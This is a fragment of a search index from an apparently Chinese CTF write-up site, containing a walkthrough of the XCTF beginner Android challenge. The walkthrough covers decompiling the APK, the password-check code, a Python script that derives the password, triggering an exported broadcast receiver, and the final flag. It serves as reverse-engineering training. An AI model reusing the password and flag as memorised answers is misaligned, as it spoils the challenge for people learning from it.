getApplicationContext (). getDatabasePath ( \"img.jpg\" ). getAbsolutePath (); try { File f = new File ( strFile ); if ( f . exists ()) { f . delete (); } } catch ( Exception e ) { e . printStackTrace (); } try { InputStream is = getApplicationContext (). getResources (). getAssets (). open ( \"timg_2.zip\" ); FileOutputStream fos = new FileOutputStream ( strFile ); byte [] buffer = new byte [ 1024 ] ; while ( true ) { int count = is . read ( buffer ); if ( count <= 0 ) { break ; } fos . write ( buffer , 0 , count ); } fos . flush (); fos . close (); is . close (); } catch ( Exception e2 ) { e2 . printStackTrace (); } this . imageView . setImageBitmap ( BitmapFactory . decodeFile ( strFile )); } } \u627e\u5230\u6587\u4ef6\uff1a ./resources/assets/timg_2.zip ,\u3000\u6587\u4ef6\u662f\u4e00\u4e2a\u56fe\u7247\uff1a $ file ./resources/assets/timg_2.zip ./resources/assets/timg_2.zip: JPEG image data, JFIF standard 1 .01, resolution ( DPI ) , density 96x96, segment length 16 , baseline, precision 8 , 1200x1685, components 3 5 flag flag{08067-wlecome}","title":"Mobile \u57fa\u7840android"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E5%9F%BA%E7%A1%80android/#1","text":"wget https://adworld.xctf.org.cn/media/file/task/6a0484a135bb44ba8fdcf829b5d9865b.apk jadx 6a0484a135bb44ba8fdcf829b5d9865b.apk resources/AndroidManifest.xml <?xml version=\"1.0\" encoding=\"utf-8\"?> <manifest xmlns:android= \"http://schemas.android.com/apk/res/android\" android:versionCode= \"1\" android:versionName= \"1.0\" package= \"com.example.test.ctf02\" platformBuildVersionCode= \"24\" platformBuildVersionName= \"7\" > <uses-sdk android:minSdkVersion= \"14\" android:targetSdkVersion= \"24\" /> <application android:theme= \"@style/AppTheme\" android:label= \"@string/app_name\" android:icon= \"@mipmap/ic_launcher\" android:debuggable= \"true\" android:allowBackup= \"true\" android:supportsRtl= \"true\" > <activity android:name= \"com.example.test.ctf02.MainActivity\" > <intent-filter> <action android:name= \"android.intent.action.MAIN\" /> <category android:name= \"android.intent.category.LAUNCHER\" /> </intent-filter> </activity> <receiver android:name= \"com.example.test.ctf02.GetAndChange\" android:enabled= \"true\" android:exported= \"true\" > <intent-filter> <action android:name= \"android.is.very.fun\" /> </intent-filter> </receiver> <activity android:name= \"com.example.test.ctf02.NextContent\" /> <activity android:name= \"com.example.test.ctf02.MainActivity2\" /> </application> </manifest>","title":"1 \u9898\u76ee"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E5%9F%BA%E7%A1%80android/#2-mainactivity","text":"sources/com/example/test/ctf02/MainActivity.java @Override // android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity, android.support.v4.app.BaseFragmentActivityGingerbread, android.app.Activity public void onCreate ( Bundle savedInstanceState ) { super . onCreate ( savedInstanceState ); setContentView ( R . layout . acticity_main_1 ); this . passWord = ( EditText ) findViewById ( R . id . passWord ); this . login = ( Button ) findViewById ( R . id . button ); this . login . setOnClickListener ( new View . OnClickListener () { // from class: com.example.test.ctf02.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick ( View v ) { String str = MainActivity . this . passWord . getText (). toString (); Check check = new Check (); if ( check . checkPassword ( str )) { Toast . makeText ( MainActivity . this , \"Good,Please go on!\" , 0 ). show (); Intent intent = new Intent ( MainActivity . this , MainActivity2 . class ); MainActivity . this . startActivity ( intent ); MainActivity . this . finish (); return ; } Toast . makeText ( MainActivity . this , \"Failed\" , 0 ). show (); } }); } ./sources/com/example/test/ctf02/Check.java package com.example.test.ctf02 ; /* loaded from: classes.dex */ public class Check { public boolean checkPassword ( String str ) { char [] pass = str . toCharArray (); if ( pass . length != 12 ) { return false ; } for ( int len = 0 ; len < pass . length ; len ++ ) { pass [ len ] = ( char ) ((( 255 - len ) - 100 ) - pass [ len ] ); if ( pass [ len ] != '0' || len >= 12 ) { return false ; } } return true ; } } \u4ece\u4e0a\u6587\u53ef\u77e5\uff1a\u3000\u8f93\u5165\u7684\u5bc6\u7801\u4f7f Check \u7684 checkPassword \u51fd\u6570\u8fd4\u56detrue\uff0c\u5219\u8df3\u8f6c MainActivity2 exp1.py \uff1a pwd = [] plen = 12 for i in range ( plen ): pwd . append ( ( ( 255 - i ) - 100 ) - ord ( '0' )) print ( bytes ( pwd )) # b'kjihgfedcba`'","title":"2 MainActivity"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E5%9F%BA%E7%A1%80android/#3-mainactivity2","text":"sources/com/example/test/ctf02/MainActivity2.java @Override // android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity, android.support.v4.app.BaseFragmentActivityGingerbread, android.app.Activity public void onCreate ( Bundle savedInstanceState ) { super . onCreate ( savedInstanceState ); setContentView ( R . layout . activity_main_2 ); init (); this . button . setOnClickListener ( new View . OnClickListener () { // from class: com.example.test.ctf02.MainActivity2.1 @Override // android.view.View.OnClickListener public void onClick ( View v ) { String str = MainActivity2 . this . editText . getText (). toString (); Intent intent = new Intent ( str ); MainActivity2 . this . sendBroadcast ( intent ); } }); } public void init () { this . imageView = ( ImageView ) findViewById ( R . id . image ); this . imageView . setImageResource ( R . drawable . timg ); this . editText = ( EditText ) findViewById ( R . id . pwd ); this . button = ( Button ) findViewById ( R . id . button ); } ./sources/com/example/test/ctf02/GetAndChange.java public class GetAndChange extends BroadcastReceiver { @Override // android.content.BroadcastReceiver public void onReceive ( Context context , Intent intent ) { Intent intent1 = new Intent ( context , NextContent . class ); context . startActivity ( intent1 ); } }","title":"3 MainActivity2"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E5%9F%BA%E7%A1%80android/#4-nextcontent","text":"./sources/com/example/test/ctf02/NextContent.java public class NextContent extends AppCompatActivity { ImageView imageView ; /* JADX INFO: Access modifiers changed from: protected */ @Override // android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity, android.support.v4.app.BaseFragmentActivityGingerbread, android.app.Activity public void onCreate ( Bundle savedInstanceState ) { super . onCreate ( savedInstanceState ); setContentView ( R . layout . activity_next_content ); init (); Change (); } public void init () { this . imageView = ( ImageView ) findViewById ( R . id . imageview ); } public void Change () { String strFile = getApplicationContext (). getDatabasePath ( \"img.jpg\" ). getAbsolutePath (); try { File f = new File ( strFile ); if ( f . exists ()) { f . delete (); } } catch ( Exception e ) { e . printStackTrace (); } try { InputStream is = getApplicationContext (). getResources (). getAssets (). open ( \"timg_2.zip\" ); FileOutputStream fos = new FileOutputStream ( strFile ); byte [] buffer = new byte [ 1024 ] ; while ( true ) { int count = is . read ( buffer ); if ( count <= 0 ) { break ; } fos . write ( buffer , 0 , count ); } fos . flush (); fos . close (); is . close (); } catch ( Exception e2 ) { e2 . printStackTrace (); } this . imageView . setImageBitmap ( BitmapFactory . decodeFile ( strFile )); } } \u627e\u5230\u6587\u4ef6\uff1a ./resources/assets/timg_2.zip ,\u3000\u6587\u4ef6\u662f\u4e00\u4e2a\u56fe\u7247\uff1a $ file ./resources/assets/timg_2.zip ./resources/assets/timg_2.zip: JPEG image data, JFIF standard 1 .01, resolution ( DPI ) , density 96x96, segment length 16 , baseline, precision 8 , 1200x1685, components 3","title":"4 NextContent"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E5%9F%BA%E7%A1%80android/#5-flag","text":"flag{08067-wlecome}","title":"5 flag"},{"location":"%E7%AE%97%E6%B3%95/","text":"","title":"Index"}]}